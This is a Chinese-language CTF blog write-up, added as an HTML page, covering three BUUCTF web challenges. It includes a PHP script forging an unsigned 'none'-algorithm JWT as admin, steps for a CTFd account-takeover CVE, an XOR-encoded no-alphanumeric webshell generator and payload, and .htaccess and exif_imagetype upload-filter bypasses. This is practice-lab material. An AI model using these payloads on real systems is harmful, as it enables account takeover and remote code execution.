@@ -1,0 +1,488 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>BUUCTF21 | Tcy👦♥QQ👧</title><meta name="keywords" content="jwt相关攻击|代码审计（node.js）,CTFd CVE账户接管漏洞,无字母数字webshell,绕过open_basedir,htaccess 绕过上传限制"><meta name="author" content="uploads"><meta name="copyright" content="uploads"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="最近状态不太好！！！😶😶😶😶😶😶 不行！不要放弃！你既然喜欢渗透！！！那就要坚持！！！  不要怕！！！干就完了！ 刷刷刷！！！刷 [HFCTF2020]EasyLogin 上来又是一个登录框！！！ sql注入！还是啥！ 随便注册了个！ 登录后要我输入flag!!!😏🙄 哎呀 去学学node.jsNode.js 是运行在服务端的 JavaScript，如果你熟悉Javascript，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF21">
+<meta property="og:url" content="https://tanchiyu.top/2021/02/01/BUUCTF-21/index.html">
+<meta property="og:site_name" content="Tcy👦♥QQ👧">
+<meta property="og:description" content="最近状态不太好！！！😶😶😶😶😶😶 不行！不要放弃！你既然喜欢渗透！！！那就要坚持！！！  不要怕！！！干就完了！ 刷刷刷！！！刷 [HFCTF2020]EasyLogin 上来又是一个登录框！！！ sql注入！还是啥！ 随便注册了个！ 登录后要我输入flag!!!😏🙄 哎呀 去学学node.jsNode.js 是运行在服务端的 JavaScript，如果你熟悉Javascript，">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tanchiyu.top/image/ttt.jpg">
+<meta property="article:published_time" content="2021-02-01T06:14:07.000Z">
+<meta property="article:modified_time" content="2021-02-02T03:00:21.816Z">
+<meta property="article:author" content="uploads">
+<meta property="article:tag" content="jwt相关攻击|代码审计（node.js）">
+<meta property="article:tag" content="CTFd CVE账户接管漏洞">
+<meta property="article:tag" content="无字母数字webshell">
+<meta property="article:tag" content="绕过open_basedir">
+<meta property="article:tag" content="htaccess 绕过上传限制">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tanchiyu.top/image/ttt.jpg"><link rel="shortcut icon" href="/%E7%94%B7%E5%AD%A9.png"><link rel="canonical" href="https://tanchiyu.top/2021/02/01/BUUCTF-21/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}
+
+// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
+const getScript = url => new Promise((resolve, reject) => {
+  const script = document.createElement('script')
+  script.src = url
+  script.async = true
+  script.onerror = reject
+  script.onload = script.onreadystatechange = function() {
+    const loadState = this.readyState
+    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+    script.onload = script.onreadystatechange = null
+    resolve()
+  }
+  document.head.appendChild(script)
+})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-02-02 11:00:21'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'true'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Tcy👦♥QQ👧" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" data-lazy-src="/image/pp.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">54</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">107</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> ♥♥♥</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/2.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Tcy👦♥QQ👧</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> ♥♥♥</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">BUUCTF21</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-02-01T06:14:07.000Z" title="发表于 2021-02-01 14:14:07">2021-02-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-02-02T03:00:21.816Z" title="更新于 2021-02-02 11:00:21">2021-02-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/BUUCTF/">BUUCTF</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>9分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>最近状态不太好！！！😶😶😶😶😶😶</p>
+<p>不行！不要放弃！你既然喜欢渗透！！！那就要坚持！！！  不要怕！！！干就完了！</p>
+<p>刷刷刷！！！刷</p>
+<h1 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h1><p><img src= "/img/loading.gif" data-lazy-src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210201141617785.png" alt="image-20210201141617785"></p>
+<p>上来又是一个登录框！！！</p>
+<p>sql注入！还是啥！</p>
+<p>随便注册了个！</p>
+<p>登录后要我输入flag!!!😏🙄</p>
+<p>哎呀</p>
+<h2 id="去学学node-js"><a href="#去学学node-js" class="headerlink" title="去学学node.js"></a>去学学node.js</h2><p>Node.js 是运行在服务端的 JavaScript，如果你熟悉Javascript，那么你将会很容易的学会Node.js。</p>
+<p>学学！！！</p>
+<p>日了好像Node.js不需要web服务器里！！！tql</p>
+<p><img src= "/img/loading.gif" data-lazy-src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210201145513884.png" alt="image-20210201145513884"></p>
+<p>啊啊啊啊啊！速看是真的快！不过每次做题的点！去看语言都找不到在哪！！！😫😫😫😫</p>
+<p>直接考到了框架！！！这   妈的！！老子学给看！！！web没又难题！就只有知道不知道！！！</p>
+<p>妈的！！！加油！！！！！</p>
+<p>考的大佬的图：</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://img2020.cnblogs.com/blog/1960851/202004/1960851-20200423162657039-1317969398.png" alt="img"></p>
+<p>形式：eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.（这里有一个点）eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.（这里也有一个点）TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ<br>第一个点前为header，第二个点前为payload，第二个点后为signture<br>一个攻击点：当header中的alg为none时，后端将不执行签名验证。将alg更改为none后，从JWT中删除签名数据（仅标题+’.’+ payload +’.’）并将其提交给服务器。</p>
+<p>反正记住header和payload是：</p>
+<p>前面提到，Header 和 Payload 串型化的算法是 Base64URL。这个算法跟 Base64 算法基本类似，但有一些小的不同。</p>
+<p>JWT 作为一个令牌（token），有些场合可能会放到 URL（比如 api.example.com/?token=xxx）。Base64 有三个字符<code>+</code>、<code>/</code>和<code>=</code>，在 URL 里面有特殊含义，所以要被替换掉：<code>=</code>被省略、<code>+</code>替换成<code>-</code>，<code>/</code>替换成<code>_</code> 。这就是 Base64URL 算法。</p>
+<h2 id="jwt-’none’绕过"><a href="#jwt-’none’绕过" class="headerlink" title="jwt.’none’绕过"></a>jwt.’none’绕过</h2><p>JSON Web Token 入门教程</p>
+<p><a target="_blank" rel="noopener" href="http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html">http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html</a></p>
+<p>深入了解Json Web Token之实战篇</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/181261.html">https://www.freebuf.com/articles/web/181261.html</a></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://www.wangbase.com/blogimg/asset/201807/bg2018072303.jpg" alt="img"></p>
+<p>哎呀！！！啥也不知道！！！</p>
+<p>通过2. 将加密方式改为’none’绕过！！！和上回还不一样！！！</p>
+<p>找到了上面直接构造：exp</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a=<span class="string">&#x27;&quot;alg&quot;:&quot;none&quot;,&quot;typ&quot;:&quot;JWT&quot;&#x27;</span>;</span><br><span class="line">$b = <span class="string">&#x27;&#123;&quot;secretid&quot;:[],&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;iat&quot;:1590582025&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode($a);</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;\n&quot;</span>; </span><br><span class="line"><span class="keyword">echo</span> base64_encode($b);</span><br><span class="line"><span class="comment">#eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=</span></span><br><span class="line"><span class="comment">#eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMzQ1NiIsImlhdCI6MTU5MDU4MjAyNX0=</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">  </span><br></pre></td></tr></table></figure>
+
+
+
+<p>注意最后：</p>
+<p>等号变成：eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.</p>
+<p>eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMzQ1NiIsImlhdCI6MTU5MDU4MjAyNX0.</p>
+<h1 id="V-amp-N2020-公开赛-HappyCTFd"><a href="#V-amp-N2020-公开赛-HappyCTFd" class="headerlink" title="[V&amp;N2020 公开赛]HappyCTFd"></a>[V&amp;N2020 公开赛]HappyCTFd</h1><p><img src= "/img/loading.gif" data-lazy-src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210201161418752.png" alt="image-20210201161418752"></p>
+<p>直接来了个ctfd!刚开始还因为题目在里面呢🙄</p>
+<p>看了看题目知道了！！</p>
+<p>登录看看！</p>
+<p>发现admin用户有了！</p>
+<p>好卡呀！！！</p>
+<p>进去后发现啥也没有！</p>
+<p>但是<img src= "/img/loading.gif" data-lazy-src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210201161920473.png" alt="image-20210201161920473"></p>
+<p>这是要干啥</p>
+<p>好家伙！直接cve复现！！！可以👾</p>
+<h2 id="CTFd账户接管漏洞"><a href="#CTFd账户接管漏洞" class="headerlink" title="CTFd账户接管漏洞"></a>CTFd账户接管漏洞</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">注册一个空格admin用户</span><br><span class="line">登录成功后再登出</span><br><span class="line">在登录页面选择忘记密码</span><br><span class="line">改密链接会发送到注册邮箱中，这里使用buuoj的内部邮箱</span><br><span class="line">在邮箱中修改密码</span><br><span class="line">使用admin用户和更改后的密码进行登录</span><br><span class="line">在Admin Panel &#x3D;&gt;Challenges页面找到flag</span><br></pre></td></tr></table></figure>
+
+
+
+<p>我c了！！</p>
+<p>他的内网好像有问题！！！</p>
+<p><a target="_blank" rel="noopener" href="http://mail.buuoj.cn/admin/ui/client">内网邮箱地址</a></p>
+<p>邮件收不到！！！！<img src= "/img/loading.gif" data-lazy-src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210201172756830.png" alt="image-20210201172756830"></p>
+<p>服了！</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、注册</span><br><span class="line">首先申请一个内网的邮箱，因为靶机没法访问外网，在https:&#x2F;&#x2F;buuoj.cn&#x2F;resources中找到相应链接。</span><br><span class="line">然后注册账户，空格绕过：（空格）admin</span><br><span class="line"></span><br><span class="line">2.忘记密码，拿到admin的密码</span><br><span class="line">注册好以后退出登录，用admin登录（不加空格），点击忘记密码并将邮件发送到刚刚注册的内网邮箱，重置密码。</span><br><span class="line"></span><br><span class="line">3、flag</span><br><span class="line">用admin账号登录，在hidden的misc题目附件中找到flag</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h1><p>先放个大佬的文章：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11488051.html#4php%E4%B8%AD%E7%9A%84%E7%9A%84%E5%A4%A7%E6%8B%AC%E5%8F%B7%E8%8A%B1%E6%8B%AC%E5%8F%B7%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3">https://www.cnblogs.com/20175211lyz/p/11488051.html#4php%E4%B8%AD%E7%9A%84%E7%9A%84%E5%A4%A7%E6%8B%AC%E5%8F%B7%E8%8A%B1%E6%8B%AC%E5%8F%B7%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3</a></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">&quot;upload/tmp_&quot;</span>.md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/i&quot;</span>,$extension)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">&#x27;&lt;?&#x27;</span>)!==<span class="literal">False</span>) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        $path= $userdir.<span class="string">&quot;/&quot;</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>上来先来个php代码审计！</p>
+<p>大佬：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11488051.html#4php%E4%B8%AD%E7%9A%84%E7%9A%84%E5%A4%A7%E6%8B%AC%E5%8F%B7%E8%8A%B1%E6%8B%AC%E5%8F%B7%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3">https://www.cnblogs.com/20175211lyz/p/11488051.html#4php%E4%B8%AD%E7%9A%84%E7%9A%84%E5%A4%A7%E6%8B%AC%E5%8F%B7%E8%8A%B1%E6%8B%AC%E5%8F%B7%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3</a></p>
+<p><a target="_blank" rel="noopener" href="https://mayi077.gitee.io/2020/02/14/SUCTF-2019-EasyWeb/[](https://mayi077.gitee.io/2020/02/14/SUCTF-2019-EasyWeb/)">https://mayi077.gitee.io/2020/02/14/SUCTF-2019-EasyWeb/[](https://mayi077.gitee.io/2020/02/14/SUCTF-2019-EasyWeb/)</a></p>
+<p>首先为啥是无字母数字webshell呢！</p>
+<p>他是\x00到\x7F刚好是127位！可见字符都没了！考不可见字符在我的🧠里好像也就异或webshell了！</p>
+<p>那就可以想到用不可见字符(ascil码大于127的)！通过异或来获取可见字符！</p>
+<h2 id="无字母数字webshell"><a href="#无字母数字webshell" class="headerlink" title="无字母数字webshell+"></a>无字母数字webshell+</h2><p>首先是不能有字母不能有数字，我们可以用脚本</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$l = <span class="string">&quot;&quot;</span>;</span><br><span class="line">$r = <span class="string">&quot;&quot;</span>;</span><br><span class="line">$argv = str_split(<span class="string">&quot;_GET&quot;</span>);  <span class="comment">##将_GET分割成一个数组，一位存一个值</span></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($argv);$i++)&#123;   </span><br><span class="line">    <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;<span class="number">255</span>;$j++)</span><br><span class="line">    &#123;</span><br><span class="line">        $k = chr($j)^chr(<span class="number">255</span>);    <span class="comment">##进行异或         </span></span><br><span class="line">        <span class="keyword">if</span>($k == $argv[$i])&#123;</span><br><span class="line">        	<span class="keyword">if</span>($j&lt;<span class="number">16</span>)&#123;  <span class="comment">##如果小于16就代表只需一位即可表示，但是url要求是2位所以补个0</span></span><br><span class="line">        		$l .= <span class="string">&quot;%ff&quot;</span>;</span><br><span class="line">                $r .= <span class="string">&quot;%0&quot;</span> . dechex($j);</span><br><span class="line">        		<span class="keyword">continue</span>;</span><br><span class="line">        	&#125;</span><br><span class="line">            $l .= <span class="string">&quot;%ff&quot;</span>;</span><br><span class="line">            $r .= <span class="string">&quot;%&quot;</span> . dechex($j);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\&#123;<span class="subst">$l</span>`<span class="subst">$r</span>\&#125;&quot;</span>;  <span class="comment">### 这里的反引号只是用来区分左半边和右半边而已</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;%A0%B8%BA%AB^%ff%ff%ff%ff&#125;&#123;%A0&#125;();&amp;%A0&#x3D;phpinfo</span><br><span class="line">##  1^2&#x3D;2^1</span><br><span class="line">## 这里值得注意的是$&#123;_GET&#125;&#123;%A0&#125;就等于$_GET[%A0],%A0是一个字符虽然没有被引号引起来但是php也不会将他看出是变量，这就是为什么&amp;_GET[cmd]&#x3D;&amp;_GET[&quot;cmd&quot;] 了。</span><br><span class="line">## 还有一个特性是$a&#x3D;phpinfo 如果执行$a() 就相当于执行了phpinfo()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>异或简单理解：</p>
+<p>就是把ascil码进行异或！最后结果再chr一下！看脚本也可以理解他的原理！</p>
+<p><img src= "/img/loading.gif" data-lazy-src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210201185318258.png" alt="image-20210201185318258"></p>
+<p>干干干！</p>
+<h2 id="htaccess-绕过上传限制"><a href="#htaccess-绕过上传限制" class="headerlink" title=".htaccess 绕过上传限制"></a>.htaccess 绕过上传限制</h2><p>已经知道是php7</p>
+<p>他对文件的后缀和内容都有过滤！！！</p>
+<p>这里学到了一个新知识点！</p>
+<ol>
+<li><p>可以看到文件名中不能出现<code>php</code>，内容不能有&lt;?同时规定文件类型是图片。</p>
+<p>因为<code>php = 7.2</code>所以不能用``来绕过文件内容（&lt;?）过滤。在上面<code>phpinfo</code>中可以看环境是<code>Apache + PHP</code>，所以可以通过上传<code>.htaccess</code>绕过文件名过滤，然后通过编码解码绕过文件内容过滤。</p>
+</li>
+</ol>
+<h3 id="对于exif-imagetype-的绕过方式："><a href="#对于exif-imagetype-的绕过方式：" class="headerlink" title="对于exif_imagetype()的绕过方式："></a>对于<code>exif_imagetype()</code>的绕过方式：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用\x00\x00\x8a\x39\x8a\x39绕过</span><br><span class="line">使用#define width 1337\n#define height 1337绕过</span><br></pre></td></tr></table></figure>
+
+
+
